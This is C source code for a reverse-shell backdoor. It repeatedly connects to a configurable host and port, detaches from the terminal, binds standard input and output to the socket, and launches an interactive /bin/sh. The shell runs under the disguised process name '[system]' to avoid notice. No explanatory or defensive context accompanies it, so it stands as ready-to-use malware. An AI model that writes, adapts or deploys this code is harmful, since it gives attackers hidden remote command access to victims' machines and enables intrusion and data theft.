#include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <sys/socket.h>
 #include <string.h>
 #include <netdb.h>

 char server[] = "localhost";
 int port = 1234;
 char shell[] = "/bin/sh";
 char fakename[] = "[system]";
 int TIMEOUT = 3;

 int main(int arg, char **argv[])
 {
int mainsock;
char title[4096] = "";
int x;

again:

mainsock = socket (AF_INET, SOCK_STREAM, 0);
struct sockaddr_in sin;
struct hostent *host = gethostbyname (server);

memcpy (&sin.sin_addr.s_addr, host->h_addr, host->h_length);
sin.sin_family = AF_INET;
sin.sin_port = htons (port);

if(connect (mainsock, (struct sockaddr *) &sin, sizeof (sin)) < 0)
{
	   sleep(TIMEOUT);
	   goto again;
}

setsid();
umask(0);
dup2(mainsock, 0);
dup2(mainsock, 1);
dup2(mainsock, 2);

sprintf(title, "Welcome %s (%s)", getenv("USER"), getenv("HOME"));
chdir(getenv("HOME"));

for(x = 0; x <= (strlen(title) + 3); x++)  fprintf(stderr, "+");
fprintf(stderr, "\n");
fprintf(stderr, "+ %s +\n", title);
for(x = 0; x <= (strlen(title) + 3); x++)  fprintf(stderr, "+");
fprintf(stderr, "\n");

execl( shell, fakename,"-i" ,0);
 close(mainsock);
return 0;
 }
